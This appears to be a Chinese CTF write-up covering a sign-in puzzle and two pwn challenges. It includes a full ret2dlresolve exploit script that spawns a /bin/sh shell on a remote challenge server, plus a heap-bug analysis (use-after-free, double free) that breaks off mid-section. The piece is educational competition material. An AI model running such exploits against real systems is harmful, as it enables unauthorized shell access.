---
title: 第一届创宇杯wp
url: https://mp.weixin.qq.com/s/ByCpDzTvEFXQhD_gLUGoMw
source: Doonsec's feed
date: 2026-09-20
fetch_date: 2026-09-21T07:25:37.910600
---

# 第一届创宇杯wp

# 第一届创宇杯wp

原创

三社院信息Sec
三社院信息Sec

三社院信息Sec

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

#01

签到题 (霓虹迷宫)

发现game.js

![](https://mmbiz.qpic.cn/mmbiz_png/IjQoEYG92cxbTZewhpe1fFU7YruBERu07gImiaibMNr8pLwWiafYqkH30pWeexhdiaBhF6ksMSDRYLEIMXQ32icuQ1lrN7IYJ279jlv1FD8oc9M0/640?wx_fmt=png&from=appmsg)

直接出铭文flag

![](https://mmbiz.qpic.cn/mmbiz_png/IjQoEYG92czLd0kiaue2O1xD7uT5YSdScZr2cfmdZk5iav1C5yKtzuSAXAv8QsAOTAUwAicn2XDzAglIE1JRZUnBibHUYs071icrcvqbzGeZweLE/640?wx_fmt=png&from=appmsg)

```
flag{1dbc1e04-5de9-4dac-a8ae-5343dc2f04a5}
```

#02

pwn1 blindrop

附件得到

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IjQoEYG92czOHBDsjibBSKZiaqiaflibHW75qnOj9KewbKXPEV12Ia5ibiczaIthC9RhHEWhrLCWuMsUuOmutibTQpyeW1XqRbMALkibWFrSQSGbGHY/640?wx_fmt=png&from=appmsg)

file blindrop查看什么类型的文件

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IjQoEYG92cwpJrMkibjyZvSOUj4Qo4V6GARAQaUXsC1OspdCUZ4SoprWy8NFK1yxiaXle2xhDrpYjdLhj0dhQVOtPHhucCwASOYobjxicqwCr8/640?wx_fmt=png&from=appmsg)

```
blindrop: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=db111926e62c6169ec34af47ee5cb2c906b4de36, for GNU/Linux 3.2.0, with debug_info, not stripped
```

这里的回显可以看出是个32位的程序，依赖libc,而且显示 not stripped 不去符号，函数名字都还在

查看一下开的保护

```
 python3 - <<'EOF'from pwn import *e = ELF('./blindrop')print(e.checksec())EOF
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IjQoEYG92czia1iaILDGq1rsqhEtNQtIfEGP2ESeXdcEcZ8F8IvT1R6rjib8z2MTJdnLtB4fOS4zKDzSzPic7NK0ZrlKpUCYz6rIW5J4VcVThAo/640?wx_fmt=png&from=appmsg)

发现程序每次运行都可以运行，代码都是固定的地址，而且栈溢出不会被拦截

尝试答应出来符号表

```
 python3 - <<'EOF'from pwn import *e = ELF('./blindrop')for k, v in sorted(e.symbols.items()):    print(hex(v), k)EOF
```

![](https://mmbiz.qpic.cn/mmbiz_png/IjQoEYG92czxwBopHwjE79UCLaT9ROAsl1fRmqUcPsQkp1ZHQcya2CfhCDCTZV1xnicHsbtldsHaTXx5l0nrjKc52NJ0vooerFic8PXWmMcuw/640?wx_fmt=png&from=appmsg)

其中有

![](https://mmbiz.qpic.cn/mmbiz_png/IjQoEYG92cxiae5DX8INAunBanfloXjMxPQZFK87VJe4IA118V7vYibjGibuJpuBFFTn4vgnfibUxV1fJv6yyFJIjib4ozIDSSZic5HUQAocqmo58/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/IjQoEYG92cznrAI7dUZQslqiauLrAzc3CwwfxNPicsASsbgVDibukKVFjbcsBbMiaADMNXGRt8NEusC6ibMxsBvMKC9ahPO7tYRDGmfRqafn4cxM/640?wx_fmt=png&from=appmsg)

感觉vuln可以尝试一下

我们就利用一下vuln尝试找找漏洞，用capstone反汇编一下vuln

```
python3 - <<'EOF'from pwn import *from capstone import *e = ELF('./blindrop')md = Cs(CS_ARCH_X86, CS_MODE_32)for ins in md.disasm(e.read(0x8049223, 0xa0), 0x8049223):    print('0x%x: %-8s %s' % (ins.address, ins.mnemonic, ins.op_str))EOF
```

```
0x8049227: sub      esp, 0x94    栈上开了0x940x8049257: push     0x400     0x804925c: lea      eax, [c]  参数是buf 在栈上ebp-0x8c0x8049265: call     0x8049050  这里可能存在漏洞
```

从之前的输出的分析出栈布局从buf  (ebp-0x8c)开始应该就是返回地址的偏移 =0x94=144字节 就是说payload前144的字节没用，145才是我们想要的地址，绕过方式：程序会比较[ebp+8] (偏移0x94)和[edp-0xc] (偏移0x80)是否相等两个相同就通过

利用read 把一套伪造的链接表写进内存，然后跳转到plt 的开头(plt0),动态链接就会以为是真。就会得出system（"/bin/sh"）

准备地址

```
python3 - <<'EOF'from pwn import *e = ELF('./blindrop')print('read@plt  ', hex(e.plt['read']))print('plt0      ', hex(e.get_section_by_name('.plt').header.sh_addr))print('JMPREL    ', hex(e.dynamic_value_by_tag('DT_JMPREL')))print('SYMTAB    ', hex(e.dynamic_value_by_tag('DT_SYMTAB')))print('STRTAB    ', hex(e.dynamic_value_by_tag('DT_STRTAB')))EOF
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IjQoEYG92czJRvFeiae9kgaxNWjDV32CPzdbxXIJwL0iatiaocN5qP74Iej1PhzAk4RPxOXQKJDqsmrp8cQIIEiaFYRkZXyiaYOPCe7TEcmvic8KY/640?wx_fmt=png&from=appmsg)

最后用脚本

```
import socket, struct, time
HOST, PORT = "challenge.xiaoyuyc.com", 35723def p32(x): return struct.pack("<I", x & 0xffffffff)
read_plt = 0x08049050plt0     = 0x08049030JMPREL   = 0x080483b0SYMTAB   = 0x080481ecSTRTAB   = 0x080482bcpop3ret  = 0x0804901f          # add esp,8 ; pop ebx ; ret
B          = 0x0804b300fake_reloc = Bfake_sym   = B + 0x2csys_str    = B + 0x60binsh_str  = B + 0x80write_tgt  = B + 0x100
sym_index    = (fake_sym - SYMTAB) // 16reloc_offset = fake_reloc - JMPREL
# 伪造 Elf32_Rel + Elf32_Sym + "system" + "/bin/sh"rel = p32(write_tgt) + p32((sym_index << 8) | 7)sym = p32(sys_str - STRTAB) + p32(0) + p32(0) + bytes([0x12, 0]) + struct.pack("<H", 0)blob = bytearray(b"\x00" * 0x100)blob[0x00:0x08] = relblob[0x2c:0x3c] = symblob[0x60:0x67] = b"system\x00"blob[0x80:0x88] = b"/bin/sh\x00"blob = bytes(blob)
V = pop3retpayload  = b"A" * 0x80         payload += p32(V)               payload += p32(0)             payload += p32(0)               payload += p32(0)               payload += p32(read_plt)       payload += p32(V)               payload += p32(0)               payload += p32(B)               payload += p32(len(blob))       payload += p32(plt0)            payload += p32(reloc_offset)    payload += p32(0)               payload += p32(binsh_str)
s = socket.create_connection((HOST, PORT), timeout=10)s.settimeout(3)
def recv_until(marker, timeout=8):    s.settimeout(timeout)    data = b""    while marker not in data:        try:            chunk = s.recv(4096)        except socket.timeout:            break        if not chunk:            break        data += chunk    return data
recv_until(b"payload> ")           s.sendall(payload)                 recv_until(b"canary check passed.") time.sleep(0.3)s.sendall(blob)                    time.sleep(0.5)s.sendall(b"cat flag\n")
time.sleep(2)s.settimeout(4)out = b""try:    while True:        c = s.recv(4096)        if not c:            break        out += cexcept socket.timeout:    passprint(out.decode(errors="replace"))
```

```
flag：flag{78497480-426b-4979-84da-c71d20675763}
```

#03

PWN2--miao

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IjQoEYG92cxojKwsUzMI3qm9icYkQG2atgNjP94DU1SMu5G18IC1SM3ibB3XXfXj7aHZAeEcYyRwPmILDGlLTQL1jqqtcEMZOBxkF10UIL7x4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IjQoEYG92czicmDQJuRstjIPEWqooX2GZIhB9bQGoCNz8icaib3TN9IWBcZOb7GF1x14ZfdKn6WPDHicQgVVPYCa2gX8GiaHOFFMdSkerpr2HGmU/640?wx_fmt=png&from=appmsg)

先查看文件类型和保护措施

![](https://mmbiz.qpic.cn/mmbiz_png/IjQoEYG92cz7Z6uPEG3QCiaibwvzlgO1IdjptpvSeQEQHCdjnj5dibWkYHEEVeRmiaTdnp9mKiaXFkXcX7y0nlGVrpMjhUHFvBhvEuq18OKEuNzs/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/IjQoEYG92cyUXlnvpaeZLPicV1HzUxibWhvibCt9cKQGFbq5lwN9vcAduymyg164uLsVGtW92D4MV3VVBZH5eMGRU1xpzBCvvnwH9A5nnibLlKw/640?wx_fmt=png&from=appmsg)

可以看到有Full RELRO 和glibc 2.35 → `__free_hook` / `__malloc_hook`，不能直接打got 和hook

就要试试fsop

开始逆向分析

```
objdump -d -M intel miao
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/IjQoEYG92cx7SpLV7Mw1O8EMp3XGkznpBuz8MnF7fvHFmCcD4icA9S3X3XGETZxucoMOsxia1837yvicicEZeZ7S8iaEDLzqicNHI9RAEcML4ibyJI/640?wx_fmt=png&from=appmsg)

数据结构

notes`数组在`.bss`（PIE +`0x4060`），共 16 项，每项 16 字节：

```
struct note {    char  *ptr;       size_t size;  };struct note notes[16];
```

```
unsigned long long read_num() {    char buf[0x20];    memset(buf, 0, 0x20);    read(0, buf, 0x1f);              return strtoull(buf, 0, 0);  }
```

索引都是 `read_num` 的返回值，后面用 `<= 0xf` 检查，无法越界。

add\_note 新建笔记

```
void add_note() {    int i = -1;    for (int j = 0; j <= 15; j++)                  if (notes[j].ptr == NULL) { i = j; break; }    if (i == -1) { puts("No free slot!"); return; }
    printf("Size: ");    size_t size = read_num();    if (size == 0 || size > 0x500) { puts("Invalid size!"); return; }
    char *p = malloc(size);    if (!p) { puts("Allocation failed!"); return; }
    notes[i].ptr  = p;    notes[i].size = size;    memset(p, 0, size);                       printf("Content: ");    read(0, p, size);                          printf("Note %d created.\n", i);}
```

要点：size 最大 0x500，申请后会 `memset` 清 0，再 `read` 读入内容

delete\_note —— 删除笔记

```
void delete_note() {    printf("Index: ");    size_t i = read_num();    if (i > 0xf) { puts("Invalid index!"); return; }    if (notes[i].ptr) {        free(notes[i].ptr);        puts("Note deleted.");    }}
```

free 之后 notes[i].ptr 仍然指向那块内存，于是可以

用 show 读已经 free 的 chunk（信息泄露）

用 edit 写已经 free 的 chunk（改 tcache 链表 → tcache poisoning)

重复 free（double free）

edit\_note

```
void edit_note() ...